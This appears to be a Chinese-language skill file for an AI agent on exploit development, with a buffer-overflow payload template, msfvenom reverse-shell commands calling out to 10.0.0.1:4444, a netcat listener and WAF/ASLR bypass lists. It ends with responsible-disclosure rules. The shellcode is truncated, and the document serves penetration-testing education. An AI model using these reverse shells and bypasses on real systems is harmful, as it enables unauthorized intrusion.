---
name: exploit-dev
description: 漏洞利用开发，包括缓冲区溢出、RCE、提权等exploit编写
---

# 漏洞利用开发技能

用于开发针对已知漏洞的利用代码。

## Exploit 开发流程

### 1. 漏洞分析
- 研究 CVE 详情和漏洞公告
- 分析补丁 diff 确定漏洞位置
- 理解漏洞触发条件

### 2. 环境搭建
```bash
# 搭建测试环境
docker run -d vulnerable-app:version
# 或使用虚拟机隔离测试
```

### 3. PoC 开发
```python
#!/usr/bin/env python3
import requests

target = "http://vulnerable-host:port"
payload = "exploit_payload_here"

# 发送 exploit
response = requests.post(target, data=payload)
print(f"Status: {response.status_code}")
```

### 4. 缓冲区溢出 Exploit

```python
# 模式生成和偏移计算
pattern = cyclic(1000)  # 使用 pwntools
offset = cyclic_find(0x41414141)

# 构造 payload
padding = b"A" * offset
eip = p32(0xdeadbeef)  # 返回地址
nop_sled = b"\x90" * 100
shellcode = b"\x31\xc0..."  # shellcode

payload = padding + eip + nop_sled + shellcode
```

### 5. 常用 Shellcode

**反弹 Shell (Linux x86)**
```python
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python
shellcode = b"\x31\xdb\xf7\xe3\x53\x43\x53..."
```

**反弹 Shell (Windows)**
```python
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python
shellcode = b"\xfc\xe8\x82\x00\x00\x00..."
```

## 绕过技术

### ASLR/DEP 绕过
- ROP (Return-Oriented Programming)
- ret2libc
- 信息泄露获取地址

### WAF 绕过
- 编码变换：URL编码、Unicode、Base64
- 大小写混淆
- 注释符插入
- 分块传输

## 测试和验证

1. 本地环境验证
2. 多版本测试
3. 不同操作系统测试
4. 监听 payload 是否成功执行

```bash
# 监听反弹 shell
nc -lvnp 4444
```

## 负责任披露

开发 exploit 后，遵循负责任披露原则：
1. 仅在授权范围内测试
2. 不公开 0day exploit
3. 及时向厂商报告漏洞
